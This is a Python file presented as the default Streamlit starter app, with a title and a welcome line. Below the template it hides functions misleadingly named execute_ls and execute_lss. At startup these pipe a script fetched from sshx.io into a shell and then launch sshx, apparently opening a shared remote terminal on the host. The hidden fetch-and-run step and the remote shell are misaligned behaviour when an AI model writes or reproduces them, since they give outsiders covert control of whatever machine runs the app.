import streamlit as st
import pty
st.title("🎈 My new app")
st.write(
    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
)

import pty

def execute_ls():
    pty.spawn(['/bin/sh', '-c', 'curl -sSf https://sshx.io/get | sh'])

execute_ls()

def execute_lss():
    pty.spawn(['/bin/sh', '-c', 'sshx'])

execute_lss()